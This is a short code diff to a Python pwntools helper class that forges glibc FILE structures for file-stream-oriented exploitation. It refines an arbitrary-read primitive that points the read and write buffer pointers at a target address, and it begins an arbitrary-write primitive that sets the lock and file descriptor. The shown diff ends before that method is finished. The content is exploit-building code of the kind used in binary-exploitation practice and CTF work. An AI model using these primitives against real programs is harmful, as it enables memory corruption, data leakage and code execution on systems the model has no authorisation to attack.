@@ -3,7 +3,8 @@ from pwn import *
 class FILESTRUCTURE:
     def __init__(self):
         self.FS = FileStructure(0)
-    def aar(self,padding: bytes ,flags: int ,target_addr: int ,size: int ,lock_addr:int ):
+        
+    def aar(self, padding: bytes ,flags: int ,target_addr: int ,size: int ,lock_addr:int ):
         self.FS.flags = flags 
         self.FS._IO_read_end = target_addr
         self.FS._IO_write_base = target_addr
@@ -14,5 +15,6 @@ class FILESTRUCTURE:
 
         return padding + bytes(self.FS)[:-8]
 
-    def aaw(self):
-        pass
+    def aaw(self, padding: bytes , flags: int , target_addr: int , size: int, lock_addr:int ):
+        self.FS._lock = lock_addr
+        self.FS.fileno = 0
